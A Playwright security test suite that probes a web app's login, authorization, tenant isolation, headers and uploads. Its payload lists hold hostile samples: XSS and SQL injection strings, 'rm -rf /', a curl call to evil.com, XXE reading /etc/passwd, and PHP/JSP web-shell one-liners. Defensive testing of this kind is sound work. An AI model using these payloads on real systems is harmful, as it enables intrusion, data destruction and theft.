const { test, expect } = require('@playwright/test');
const http = require('http');
const https = require('https');
const crypto = require('crypto');

// Security test configuration
const SECURITY_CONFIG = {
  baseURL: process.env.BASE_URL || 'http://localhost:8080',
  apiBase: process.env.API_BASE || 'http://localhost:8080/api/v1',
  webBase: process.env.WEB_BASE || 'http://localhost:3000',
  timeout: 30000,
  maxRedirects: 5,
};

// Test data for security tests
const TEST_PAYLOADS = {
  xss: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "javascript:alert('XSS')",
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '${alert("XSS")}',
    '{{alert("XSS")}}',
  ],
  
  sqlInjection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "1' ORDER BY 1--+",
    "1' GROUP BY 1,2,3,4,5--+",
  ],
  
  commandInjection: [
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "| cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; rm -rf /",
    "&& curl http://evil.com/steal",
  ],
  
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
  ],
  
  xxe: [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
  ],
  
  ldapInjection: [
    "*)(uid=*",
    "*)(|(password=*))",
    "admin)(&(password=*))",
    "*))%00",
  ],
  
  nosqlInjection: [
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$gt": ""}',
  ],
};

test.describe('Security Test Suite', () => {
  
  test.describe('Authentication Security', () => {
    test('should prevent brute force attacks', async ({ page }) => {
      const attempts = [];
      
      // Attempt multiple failed logins
      for (let i = 0; i < 10; i++) {
        const startTime = Date.now();
        
        await page.goto('/login');
        await page.fill('input[name="email"]', 'admin@example.com');
        await page.fill('input[name="password"]', `wrongpassword${i}`);
        await page.click('button[type="submit"]');
        
        const endTime = Date.now();
        attempts.push(endTime - startTime);
        
        // After 5 attempts, should show rate limiting
        if (i >= 4) {
          await expect(page.locator('[data-testid="rate-limit-message"]')).toBeVisible();
        }
      }
      
      // Response times should increase (rate limiting)
      expect(attempts[9]).toBeGreaterThan(attempts[0]);
    });

    test('should implement account lockout', async ({ page }) => {
      await page.goto('/login');
      
      // Attempt multiple failed logins
      for (let i = 0; i < 6; i++) {
        await page.fill('input[name="email"]', 'lockout@example.com');
        await page.fill('input[name="password"]', `wrong${i}`);
        await page.click('button[type="submit"]');
        
        if (i >= 4) {
          await expect(page.locator('text=Account temporarily locked')).toBeVisible();
        }
      }
    });

    test('should enforce strong password requirements', async ({ page }) => {
      await page.goto('/register');
      
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'abc',
        'PASSWORD',
        'Password1', // Missing special character
      ];
      
      for (const password of weakPasswords) {
        await page.fill('input[name="password"]', password);
        await page.click('button[type="submit"]');
        
        await expect(page.locator('[data-testid="password-strength-error"]')).toBeVisible();
        await page.fill('input[name="password"]', ''); // Clear for next test
      }
    });

    test('should implement secure session management', async ({ page }) => {
      // Login
      await page.goto('/login');
      await page.fill('input[name="email"]', 'admin@example.com');
      await page.fill('input[name="password"]', 'password123');
      await page.click('button[type="submit"]');
      
      await page.waitForURL('**/dashboard');
      
      // Check for secure session cookie
      const cookies = await page.context().cookies();
      const sessionCookie = cookies.find(c => c.name.includes('session') || c.name.includes('token'));
      
      if (sessionCookie) {
        expect(sessionCookie.httpOnly).toBe(true);
        expect(sessionCookie.secure).toBe(true);
        expect(sessionCookie.sameSite).toBe('Strict');
      }
      
      // Session should expire after inactivity
      await page.waitForTimeout(1000 * 60 * 30); // Wait 30 minutes (simulated)
      await page.reload();
      
      // Should redirect to login
      await expect(page).toHaveURL(/.*login/);
    });
  });

  test.describe('Input Validation Security', () => {
    test('should prevent XSS attacks', async ({ page }) => {
      await page.goto('/login');
      await page.fill('input[name="email"]', 'admin@example.com');
      await page.fill('input[name="password"]', 'password123');
      await page.click('button[type="submit"]');
      
      await page.waitForURL('**/dashboard');
      await page.goto('/customers');
      
      for (const payload of TEST_PAYLOADS.xss) {
        await page.click('[data-testid="add-customer-button"]');
        
        // Try XSS in customer name field
        await page.fill('input[name="name"]', payload);
        await page.fill('input[name="email"]', 'test@example.com');
        await page.fill('input[name="phone"]', '+1-555-0123');
        
        await page.click('[data-testid="save-customer-button"]');
        
        // Should not execute JavaScript
        const alertPromise = page.waitForEvent('dialog', { timeout: 2000 }).catch(() => null);
        const alert = await alertPromise;
        expect(alert).toBeNull();
        
        // Should sanitize/escape the input
        if (await page.locator('[data-testid="success-toast"]').isVisible()) {
          const customerName = await page.locator(`text=${payload}`).textContent().catch(() => null);
          if (customerName) {
            expect(customerName).not.toContain('<script>');
            expect(customerName).not.toContain('javascript:');
          }
        }
        
        // Clean up - close modal if still open
        const modal = page.locator('[data-testid="customer-form"]');
        if (await modal.isVisible()) {
          await page.click('[data-testid="cancel-button"]');
        }
      }
    });

    test('should prevent SQL injection attacks', async ({ request }) => {
      // Login first to get auth token
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      for (const payload of TEST_PAYLOADS.sqlInjection) {
        // Test in search parameter
        const searchResponse = await request.get(`${SECURITY_CONFIG.apiBase}/customers/search`, {
          headers,
          params: { q: payload }
        });
        
        // Should not cause database error
        expect(searchResponse.status()).toBeLessThan(500);
        
        // Should not return unexpected data
        if (searchResponse.ok()) {
          const data = await searchResponse.json();
          expect(Array.isArray(data) ? data.length : 0).toBeLessThan(1000); // Reasonable limit
        }
        
        // Test in customer creation
        const createResponse = await request.post(`${SECURITY_CONFIG.apiBase}/customers`, {
          headers,
          data: {
            name: payload,
            email: 'test@example.com',
            phone: '+1-555-0123'
          }
        });
        
        // Should either create customer or return validation error (not server error)
        expect(createResponse.status()).toBeLessThan(500);
      }
    });

    test('should prevent command injection', async ({ request }) => {
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      for (const payload of TEST_PAYLOADS.commandInjection) {
        // Test file upload with malicious filename
        const formData = new FormData();
        formData.append('file', new Blob(['test content']), payload);
        
        const uploadResponse = await request.post(`${SECURITY_CONFIG.apiBase}/upload`, {
          headers,
          multipart: formData
        });
        
        // Should not execute system commands
        expect(uploadResponse.status()).toBeLessThan(500);
        
        if (!uploadResponse.ok()) {
          const error = await uploadResponse.text();
          expect(error).not.toContain('/etc/passwd');
          expect(error).not.toContain('root:');
        }
      }
    });

    test('should prevent path traversal attacks', async ({ request }) => {
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      for (const payload of TEST_PAYLOADS.pathTraversal) {
        // Test file access endpoints
        const fileResponse = await request.get(`${SECURITY_CONFIG.apiBase}/files/${payload}`, {
          headers
        });
        
        // Should not access system files
        expect(fileResponse.status()).not.toBe(200);
        
        if (fileResponse.status() === 200) {
          const content = await fileResponse.text();
          expect(content).not.toContain('root:');
          expect(content).not.toContain('[boot loader]');
        }
      }
    });
  });

  test.describe('Authorization Security', () => {
    test('should enforce role-based access control', async ({ request }) => {
      // Login as regular user
      const userLoginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'user@example.com',
          password: 'password123'
        }
      });
      
      const { access_token: userToken } = await userLoginResponse.json();
      const userHeaders = { 'Authorization': `Bearer ${userToken}` };
      
      // Try to access admin endpoints
      const adminEndpoints = [
        '/tenants',
        '/users',
        '/admin/settings',
        '/admin/reports',
        '/system/health'
      ];
      
      for (const endpoint of adminEndpoints) {
        const response = await request.get(`${SECURITY_CONFIG.apiBase}${endpoint}`, {
          headers: userHeaders
        });
        
        expect(response.status()).toBe(403); // Forbidden
      }
    });

    test('should prevent privilege escalation', async ({ request }) => {
      const userLoginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'user@example.com',
          password: 'password123'
        }
      });
      
      const { access_token: userToken } = await userLoginResponse.json();
      const userHeaders = { 'Authorization': `Bearer ${userToken}` };
      
      // Try to update own user role
      const updateResponse = await request.put(`${SECURITY_CONFIG.apiBase}/users/me`, {
        headers: userHeaders,
        data: {
          role: 'admin',
          permissions: ['*']
        }
      });
      
      // Should not allow role escalation
      if (updateResponse.ok()) {
        const userData = await updateResponse.json();
        expect(userData.role).not.toBe('admin');
        expect(userData.permissions).not.toContain('*');
      } else {
        expect(updateResponse.status()).toBe(403);
      }
    });

    test('should implement proper tenant isolation', async ({ request }) => {
      // Login as tenant1 user
      const tenant1LoginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'tenant1@example.com',
          password: 'password123'
        }
      });
      
      const { access_token: tenant1Token } = await tenant1LoginResponse.json();
      const tenant1Headers = { 'Authorization': `Bearer ${tenant1Token}` };
      
      // Get tenant1's customers
      const tenant1CustomersResponse = await request.get(`${SECURITY_CONFIG.apiBase}/customers`, {
        headers: tenant1Headers
      });
      
      if (tenant1CustomersResponse.ok()) {
        const tenant1Customers = await tenant1CustomersResponse.json();
        
        // Login as tenant2 user
        const tenant2LoginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
          data: {
            email: 'tenant2@example.com',
            password: 'password123'
          }
        });
        
        const { access_token: tenant2Token } = await tenant2LoginResponse.json();
        const tenant2Headers = { 'Authorization': `Bearer ${tenant2Token}` };
        
        // Try to access tenant1's customer directly
        if (tenant1Customers.length > 0) {
          const tenant1CustomerId = tenant1Customers[0].id;
          const accessResponse = await request.get(`${SECURITY_CONFIG.apiBase}/customers/${tenant1CustomerId}`, {
            headers: tenant2Headers
          });
          
          expect(accessResponse.status()).toBe(403); // Should be forbidden
        }
      }
    });
  });

  test.describe('Data Protection Security', () => {
    test('should encrypt sensitive data', async ({ request }) => {
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      // Create customer with sensitive data
      const customerResponse = await request.post(`${SECURITY_CONFIG.apiBase}/customers`, {
        headers,
        data: {
          name: 'Test Customer',
          email: 'test@example.com',
          phone: '+1-555-0123',
          ssn: '123-45-6789', // Should be encrypted
          credit_card: '4111111111111111' // Should be encrypted
        }
      });
      
      if (customerResponse.ok()) {
        const customer = await customerResponse.json();
        
        // Sensitive fields should not be returned in plain text
        expect(customer.ssn).not.toBe('123-45-6789');
        expect(customer.credit_card).not.toBe('4111111111111111');
        
        // Should be masked or encrypted
        if (customer.ssn) {
          expect(customer.ssn).toMatch(/\*{3}-\*{2}-\d{4}|encrypted:/);
        }
        if (customer.credit_card) {
          expect(customer.credit_card).toMatch(/\*{12}\d{4}|encrypted:/);
        }
      }
    });

    test('should prevent data leakage in error messages', async ({ request }) => {
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      // Trigger various errors
      const errorTests = [
        { endpoint: '/customers/99999', method: 'GET' }, // Not found
        { endpoint: '/customers/invalid-id', method: 'GET' }, // Invalid ID
        { endpoint: '/customers', method: 'POST', data: {} }, // Validation error
      ];
      
      for (const test of errorTests) {
        let response;
        if (test.method === 'POST') {
          response = await request.post(`${SECURITY_CONFIG.apiBase}${test.endpoint}`, {
            headers,
            data: test.data
          });
        } else {
          response = await request.get(`${SECURITY_CONFIG.apiBase}${test.endpoint}`, {
            headers
          });
        }
        
        if (!response.ok()) {
          const errorText = await response.text();
          
          // Should not contain sensitive information
          expect(errorText).not.toMatch(/password|secret|key|token/i);
          expect(errorText).not.toMatch(/database|sql|table|column/i);
          expect(errorText).not.toMatch(/file system|path|directory/i);
          expect(errorText).not.toMatch(/internal server|stack trace/i);
        }
      }
    });
  });

  test.describe('Network Security', () => {
    test('should enforce HTTPS in production', async ({ request }) => {
      if (SECURITY_CONFIG.baseURL.startsWith('https://')) {
        // Test HTTP to HTTPS redirect
        const httpUrl = SECURITY_CONFIG.baseURL.replace('https://', 'http://');
        
        try {
          const response = await request.get(httpUrl, {
            maxRedirects: 0
          });
          
          // Should redirect to HTTPS
          expect([301, 302, 307, 308]).toContain(response.status());
          
          const location = response.headers()['location'];
          expect(location).toMatch(/^https:/);
        } catch (error) {
          // HTTP might not be accessible, which is also secure
          expect(error.message).toMatch(/ECONNREFUSED|SSL|certificate/);
        }
      }
    });

    test('should implement security headers', async ({ request }) => {
      const response = await request.get(SECURITY_CONFIG.baseURL);
      const headers = response.headers();
      
      // Security headers
      expect(headers['x-frame-options']).toBeTruthy();
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-xss-protection']).toBeTruthy();
      expect(headers['strict-transport-security']).toBeTruthy();
      expect(headers['content-security-policy']).toBeTruthy();
      expect(headers['referrer-policy']).toBeTruthy();
      
      // Should not reveal server information
      expect(headers['server']).not.toMatch(/apache|nginx|iis/i);
      expect(headers['x-powered-by']).toBeFalsy();
    });

    test('should implement CORS properly', async ({ request }) => {
      // Test CORS preflight request
      const preflightResponse = await request.fetch(`${SECURITY_CONFIG.apiBase}/customers`, {
        method: 'OPTIONS',
        headers: {
          'Origin': 'https://evil.com',
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'Content-Type'
        }
      });
      
      const corsHeaders = preflightResponse.headers();
      
      // Should not allow arbitrary origins
      expect(corsHeaders['access-control-allow-origin']).not.toBe('*');
      expect(corsHeaders['access-control-allow-origin']).not.toBe('https://evil.com');
      
      // Should have proper CORS configuration
      if (corsHeaders['access-control-allow-origin']) {
        expect(corsHeaders['access-control-allow-credentials']).toBeTruthy();
        expect(corsHeaders['access-control-allow-methods']).toBeTruthy();
      }
    });

    test('should implement rate limiting', async ({ request }) => {
      const requests = [];
      
      // Make rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(
          request.get(`${SECURITY_CONFIG.apiBase}/health`)
        );
      }
      
      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      
      // Check rate limiting headers
      if (rateLimitedResponses.length > 0) {
        const headers = rateLimitedResponses[0].headers();
        expect(headers['x-ratelimit-limit']).toBeTruthy();
        expect(headers['x-ratelimit-remaining']).toBeTruthy();
        expect(headers['x-ratelimit-reset']).toBeTruthy();
      }
    });
  });

  test.describe('File Security', () => {
    test('should validate file uploads', async ({ request }) => {
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      // Test malicious file uploads
      const maliciousFiles = [
        { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
        { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'application/x-jsp' },
        { name: 'test.exe', content: 'MZ\x90\x00', type: 'application/x-msdownload' },
        { name: 'test.sh', content: '#!/bin/bash\nrm -rf /', type: 'application/x-sh' },
        { name: '../../../evil.txt', content: 'path traversal test', type: 'text/plain' },
      ];
      
      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);
        
        const uploadResponse = await request.post(`${SECURITY_CONFIG.apiBase}/upload`, {
          headers,
          multipart: formData
        });
        
        // Should reject malicious files
        expect(uploadResponse.status()).not.toBe(200);
        
        if (!uploadResponse.ok()) {
          const error = await uploadResponse.text();
          expect(error).toMatch(/invalid|not allowed|forbidden/i);
        }
      }
    });

    test('should prevent file execution', async ({ request }) => {
      // This test would need specific implementation based on file handling
      // Generally checking that uploaded files are not executed
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      // Upload a legitimate file
      const formData = new FormData();
      formData.append('file', new Blob(['test content'], { type: 'text/plain' }), 'test.txt');
      
      const uploadResponse = await request.post(`${SECURITY_CONFIG.apiBase}/upload`, {
        headers,
        multipart: formData
      });
      
      if (uploadResponse.ok()) {
        const result = await uploadResponse.json();
        const fileUrl = result.url;
        
        // Access the uploaded file
        const fileResponse = await request.get(fileUrl);
        
        // Should serve with proper content-type headers
        const contentType = fileResponse.headers()['content-type'];
        expect(contentType).not.toMatch(/application\/x-|text\/x-/);
        
        // Should have proper content disposition
        const contentDisposition = fileResponse.headers()['content-disposition'];
        if (contentDisposition) {
          expect(contentDisposition).toMatch(/attachment|inline/);
        }
      }
    });
  });

  test.describe('API Security', () => {
    test('should require authentication for protected endpoints', async ({ request }) => {
      const protectedEndpoints = [
        '/customers',
        '/jobs',
        '/invoices',
        '/payments',
        '/users',
        '/settings'
      ];
      
      for (const endpoint of protectedEndpoints) {
        const response = await request.get(`${SECURITY_CONFIG.apiBase}${endpoint}`);
        
        expect(response.status()).toBe(401); // Unauthorized
      }
    });

    test('should validate JWT tokens properly', async ({ request }) => {
      const invalidTokens = [
        'Bearer invalid.token.here',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature',
        'Bearer ' + 'a'.repeat(1000), // Very long token
        'InvalidBearer token123',
        'Bearer ', // Empty token
      ];
      
      for (const token of invalidTokens) {
        const response = await request.get(`${SECURITY_CONFIG.apiBase}/customers`, {
          headers: { 'Authorization': token }
        });
        
        expect(response.status()).toBe(401);
      }
    });

    test('should prevent API enumeration', async ({ request }) => {
      const loginResponse = await request.post(`${SECURITY_CONFIG.apiBase}/auth/login`, {
        data: {
          email: 'admin@example.com',
          password: 'password123'
        }
      });
      
      const { access_token } = await loginResponse.json();
      const headers = { 'Authorization': `Bearer ${access_token}` };
      
      // Try to enumerate resources
      const enumerationAttempts = [
        '/customers/1',
        '/customers/100',
        '/customers/999999',
        '/jobs/1',
        '/jobs/100',
        '/users/1',
        '/users/admin',
      ];
      
      for (const endpoint of enumerationAttempts) {
        const response = await request.get(`${SECURITY_CONFIG.apiBase}${endpoint}`, {
          headers
        });
        
        // Should return consistent error responses (not revealing existence)
        if (!response.ok()) {
          const errorData = await response.json().catch(() => ({}));
          
          // Should not reveal whether resource exists or access is denied
          expect(errorData.message).not.toMatch(/not found|does not exist|invalid id/i);
        }
      }
    });
  });

  test.describe('Security Monitoring', () => {
    test('should detect and log security events', async ({ request }) => {
      // This test would require access to security logs
      // Simulate security events and verify they are logged
      
      const securityEvents = [
        // Failed login attempts
        { endpoint: '/auth/login', data: { email: 'admin@example.com', password: 'wrong' } },
        // SQL injection attempt
        { endpoint: '/customers/search', params: { q: "'; DROP TABLE users; --" } },
        // Unauthorized access attempt
        { endpoint: '/admin/users', headers: {} },
      ];
      
      for (const event of securityEvents) {
        let response;
        if (event.data) {
          response = await request.post(`${SECURITY_CONFIG.apiBase}${event.endpoint}`, {
            data: event.data,
            headers: event.headers
          });
        } else {
          response = await request.get(`${SECURITY_CONFIG.apiBase}${event.endpoint}`, {
            params: event.params,
            headers: event.headers
          });
        }
        
        // Events should be handled (not crash the server)
        expect(response.status()).toBeLessThan(500);
      }
      
      // In a real implementation, you would check security logs here
      // For now, we just ensure the system remains stable
    });
  });
});

// Utility functions for security testing
class SecurityTestHelpers {
  static generateRandomString(length) {
    return crypto.randomBytes(length).toString('hex');
  }
  
  static createMaliciousJWT(payload) {
    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64');
    const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
    const signature = 'malicious_signature';
    
    return `${header}.${encodedPayload}.${signature}`;
  }
  
  static async checkSecurityHeaders(response) {
    const headers = response.headers();
    
    return {
      xFrameOptions: !!headers['x-frame-options'],
      xContentTypeOptions: headers['x-content-type-options'] === 'nosniff',
      xssProtection: !!headers['x-xss-protection'],
      hsts: !!headers['strict-transport-security'],
      csp: !!headers['content-security-policy'],
      referrerPolicy: !!headers['referrer-policy'],
    };
  }
  
  static generateSQLInjectionPayloads() {
    return [
      "1' OR '1'='1",
      "'; DELETE FROM users WHERE '1'='1",
      "1' UNION SELECT username, password FROM users--",
      "'; EXEC xp_cmdshell('dir')--",
      "1'; INSERT INTO users VALUES('hacker','password')--",
    ];
  }
  
  static generateXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')"></embed>',
    ];
  }
}

module.exports = { SecurityTestHelpers };